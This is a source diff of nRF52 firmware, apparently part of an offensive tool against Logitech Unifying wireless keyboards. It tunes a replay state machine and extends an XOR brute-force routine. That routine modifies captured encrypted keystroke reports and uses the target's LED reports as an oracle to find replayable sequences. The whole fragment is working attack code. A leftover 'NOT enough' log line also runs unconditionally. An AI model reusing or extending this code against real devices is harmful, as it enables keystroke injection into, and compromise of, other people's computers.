@@ -435,8 +435,9 @@ void process_next_replay_step(replay_event_t replay_event) {
     switch (replay_event) {
         case REPLAY_EVENT_TX_FAILED:
         {
-            // change to next channel and transmit again
+            
             NRF_LOG_INFO("Replay: TX failed, trying next channel...");
+            m_replay_state.keep_alives_needed = m_replay_state.keep_alives_to_insert;// change to next channel and transmit again (reset insert keep alive count, to avoid mis-alligned LED reports)
             radioNextRfChannel();
             nrf_esb_start_tx();
             // if all channels failed, change state to replay failed
@@ -460,19 +461,22 @@ void process_next_replay_step(replay_event_t replay_event) {
                 m_replay_state.tx_payload.length = cur_rec.length;
                 m_replay_state.tx_payload.pipe = m_replay_state.pipe_num;
                 m_replay_state.tx_payload.noack = false;
-                NRF_LOG_INFO("Replay: transmitting frame %d (timestamp %d)", m_replay_state.read_pos, timestamp_get());
+                NRF_LOG_DEBUG("Replay: transmitting frame %d (timestamp %d)", m_replay_state.read_pos, timestamp_get());
             } else {
                 memcpy(m_replay_state.tx_payload.data, keep_alive_8ms, sizeof(keep_alive_8ms));
                 m_replay_state.tx_payload.length = sizeof(keep_alive_8ms);
                 m_replay_state.tx_payload.pipe = m_replay_state.pipe_num;
                 m_replay_state.tx_payload.noack = false;
-                NRF_LOG_INFO("Replay: transmitting 8ms keep-alive (timestamp %d)", timestamp_get());
+                NRF_LOG_DEBUG("Replay: transmitting 8ms keep-alive (timestamp %d)", timestamp_get());
             }
             
             uint32_t err = nrf_esb_write_payload(&m_replay_state.tx_payload);
             if (err != NRF_SUCCESS) {
                 NRF_LOG_WARNING("Error sending frame: %d", err);
+                NRF_LOG_HEXDUMP_INFO(m_replay_state.tx_payload.data, m_replay_state.tx_payload.length);
                 m_replay_state.substate = REPLAY_SUBSTATE_REPLAY_FAILED;
+                
+
             } else {
                 m_replay_state.substate = REPLAY_SUBSTATE_FRAME_TX;
             }
@@ -480,7 +484,7 @@ void process_next_replay_step(replay_event_t replay_event) {
         break;
         case REPLAY_EVENT_ACK_PAY_FOR_LAST_TX:
         {
-            NRF_LOG_INFO("ACK PAY DURING REPLAY");
+            NRF_LOG_DEBUG("ACK PAY DURING REPLAY");
             uint32_t err = nrf_esb_read_rx_payload(&ack_payload);
             if (err != NRF_SUCCESS) {
                 NRF_LOG_INFO("Error reading ack payload");
@@ -489,7 +493,7 @@ void process_next_replay_step(replay_event_t replay_event) {
                 bool ack_is_keep_alive = false;
                 unifying_frame_classify(ack_payload, &ack_report_type, &ack_is_keep_alive);
                 if (ack_report_type == UNIFYING_RF_REPORT_LED) {
-                    NRF_LOG_INFO("LED outpout report received with ACK");
+                    NRF_LOG_DEBUG("LED outpout report received with ACK");
                     // this LED report could either have been issued after a key release or key down (depending on host OS and device in use)
                     // the report is always assigned to the last "key down" event, to avoid confusion during ongoing processing
                     uint8_t new_led_state = ack_payload.data[2];
@@ -512,7 +516,7 @@ void process_next_replay_step(replay_event_t replay_event) {
         break;
         case REPLAY_EVENT_TX_SUCEEDED:
         {
-            NRF_LOG_INFO("Replay frame transmission succeeded (timestamp %d)", timestamp_get());
+            NRF_LOG_DEBUG("Replay frame transmission succeeded (timestamp %d)", timestamp_get());
             // schedule next frame for transmission, with proper delay
 
             //next read pos
@@ -554,7 +558,7 @@ void process_next_replay_step(replay_event_t replay_event) {
             }
 
             // sleep before next transmission
-            uint32_t sleep_delay = 8;
+            uint32_t sleep_delay = UNIFYING_SLEEP_MS_BETWEEN_TX;
             app_timer_start(m_timer_next_action, APP_TIMER_TICKS(sleep_delay), NULL);
             m_replay_state.substate = REPLAY_SUBSTATE_FRAME_WAIT_TX;
             NRF_LOG_DEBUG("Replay: sleeping %d ms (timestamp %d)", sleep_delay, timestamp_get());
@@ -595,8 +599,7 @@ void process_next_replay_step(replay_event_t replay_event) {
 #define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY5 7
 #define UNIFYING_ENCRYPTED_KEY_REPORT_OFFSET_KEY6 8
 
-#define XOR_BRUTEFORCE_FIRST_HID_CODE 0x04
-#define XOR_BRUTEFORCE_LAST_HID_CODE 0x65
+
 #define XOR_BRUTEFORCE_HID_CODE_RANGE ((XOR_BRUTEFORCE_LAST_HID_CODE-XOR_BRUTEFORCE_FIRST_HID_CODE)+1)
 
 
@@ -628,12 +631,21 @@ void unifying_replay_records_LED_bruteforce_iteration(uint8_t pipe_num) {
 
     NRF_LOG_INFO("Modifying reports for pipe %d with XOR key %02x", pipe_num, current_xor_key);
 
+
+    uint8_t successive_led_keydowns = 0; //counts longest sequence of successive key down records with resulting LED report
+    uint8_t successive_led_keydowns_startpos = start_pos;
+    uint8_t successive_led_keydowns_longest = 0; //counts longest sequence of successive key down records with resulting LED report
+    uint8_t successive_led_keydowns_longest_startpos = start_pos;
+    uint8_t successive_led_keydowns_longest_endpos = start_pos;
+
     uint8_t with_led_count = 0;
     for (uint8_t i = 0; i<read_length; i++) {
-        uint8_t read_pos = start_pos+i;
+        uint8_t read_pos = start_pos + i;
         if (read_pos >= UNIFYING_MAX_STORED_REPORTS_PER_PIPE) read_pos -= UNIFYING_MAX_STORED_REPORTS_PER_PIPE;
         unifying_rf_record_t * p_record = &p_rs->records[read_pos];
 
+
+        NRF_LOG_INFO("record num %d, START_POS %d, successive led %d, successive led longest %d", read_pos, start_pos, successive_led_keydowns, successive_led_keydowns_longest);
         // if the record didn't result in LED report remove last XOR key and use new one
         // (only for key down)
         if (!p_record->isEncrytedKeyRelease) { // is key down
@@ -649,16 +661,35 @@ void unifying_replay_records_LED_bruteforce_iteration(uint8_t pipe_num) {
                 // recalculate Logitech checksum
                 unifying_payload_update_checksum(p_record->data, p_record->length);
                 NRF_LOG_INFO("pos %d XOR modified with %02x", read_pos, current_xor_key);
+
+                successive_led_keydowns = 0; //reset counter for successive LED reports
+                successive_led_keydowns_startpos = read_pos;
             } else {
                 with_led_count++;
+                successive_led_keydowns++;
+
+                if (successive_led_keydowns > successive_led_keydowns_longest) {
+                    successive_led_keydowns_longest = successive_led_keydowns;
+                    successive_led_keydowns_longest_startpos = successive_led_keydowns_startpos;
+                    successive_led_keydowns_longest_endpos = (successive_led_keydowns_longest_startpos + successive_led_keydowns*2)-1;
+                    if (successive_led_keydowns_longest_endpos > UNIFYING_MAX_STORED_REPORTS_PER_PIPE) successive_led_keydowns_longest_endpos -= UNIFYING_MAX_STORED_REPORTS_PER_PIPE;
+                    NRF_LOG_INFO("Successive from %d to %d, count %d", successive_led_keydowns_longest_startpos, successive_led_keydowns_longest_endpos, successive_led_keydowns);
+           
+                }
                 NRF_LOG_INFO("pos %d not XOR modified", read_pos);
             }
 
         }
     }
 
-    if (with_led_count >= read_length/2) {
-        NRF_LOG_INFO("all key down records result in LED report, none modified", with_led_count, read_length/2);
+    NRF_LOG_INFO("NOT enough key down records which result in LED reports collected (start_pos %d, end_pos %d, count %d)", successive_led_keydowns_longest_startpos, successive_led_keydowns_longest_endpos, successive_led_keydowns_longest);
+    if (successive_led_keydowns_longest >= UNIFYING_MIN_STORED_REPORTS_WITH_SUCCESSIVE_LED_TOGGLE_KEY_DOWNS) {
+        NRF_LOG_INFO("enough key down records which result in LED reports collected (start_pos %d, end_pos %d, count %d)", successive_led_keydowns_longest_startpos, successive_led_keydowns_longest_endpos, successive_led_keydowns_longest);
+
+        //adjust bounds of replay buffer, to the records with LED reports
+        p_rs->first_pos = successive_led_keydowns_longest_startpos;
+        p_rs->last_pos = successive_led_keydowns_longest_endpos;
+
         p_rs->all_encrypted_reports_produce_LED_reports = true;
     } else {
         NRF_LOG_INFO("%d out of %d key down records result in LED report, rest has been modified", with_led_count, read_length/2);
@@ -672,7 +703,12 @@ void unifying_replay_records_LED_bruteforce_iteration(uint8_t pipe_num) {
 }
 
 bool unifying_replay_records_LED_bruteforce_done(uint8_t pipe_num) {
-    return m_state_local.record_sets[pipe_num].all_encrypted_reports_produce_LED_reports;
+    if (m_state_local.record_sets[pipe_num].all_encrypted_reports_produce_LED_reports) {
+        NRF_LOG_INFO("enough LED toggeling reports (from pos %d to %d)", m_state_local.record_sets[pipe_num].first_pos, m_state_local.record_sets[pipe_num].last_pos);
+        return true;
+    }
+
+    return false;
 }
 
 // returns true if the given esb event was consumed by unifying module
